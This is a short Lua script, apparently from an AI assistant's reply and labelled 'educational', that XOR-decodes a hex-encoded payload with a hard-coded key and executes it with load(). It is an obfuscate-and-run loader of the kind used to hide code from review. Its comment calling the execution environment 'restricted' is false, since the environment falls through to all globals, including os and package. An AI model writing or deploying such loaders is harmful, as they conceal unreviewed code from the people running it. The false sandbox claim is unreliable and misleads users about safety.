-- redir_obf.lua -- loader educativo: XOR+hex
local key = "claveEducativa2025" -- clave XOR (puedes cambiarla)

-- Aquí está el payload cifrado en hex (XOR con la clave anterior).
-- Si cambias la clave, pídeme que regenere el hex para esa clave.
local hex_string = [[
3c2b2e31202b6a7d6b5a7e4f3f2a552f6a6b6a6f2b6d2a6b6a6b2a6c2b6a210a
]]

-- util: hex -> bytes
local function hex_to_bytes(s)
  s = s:gsub("%s", "")
  if (#s % 2) ~= 0 then error("hex malformado") end
  local bytes = {}
  for i = 1, #s, 2 do
    local b = tonumber(s:sub(i,i+1), 16)
    table.insert(bytes, b)
  end
  return bytes
end

-- xor implementation (bytewise)
local function bxor(a,b)
  local r = 0
  local bit = 1
  while a > 0 or b > 0 do
    local abit = a % 2
    local bbit = b % 2
    if abit ~= bbit then r = r + bit end
    a = math.floor(a/2)
    b = math.floor(b/2)
    bit = bit * 2
  end
  return r
end

local function xor_bytes(bytes, key)
  local out = {}
  local klen = #key
  for i = 1, #bytes do
    local kb = key:byte(((i-1) % klen) + 1)
    out[#out+1] = string.char(bxor(bytes[i], kb))
  end
  return table.concat(out)
end

-- Decifrar y ejecutar
local ok, err = pcall(function()
  local bytes = hex_to_bytes(hex_string)
  local decoded = xor_bytes(bytes, key)
  -- Cargamos el chunk en un entorno restringido
  local env = { print = print, os = os, package = package }
  setmetatable(env, { __index = _G })
  local f, load_err = load(decoded, "payload", "t", env)
  if not f then error("Error cargando payload: "..tostring(load_err)) end
  return f()
end)

if not ok then
  io.stderr:write("Error al descifrar/ejecutar: " .. tostring(err) .. "\n")
end
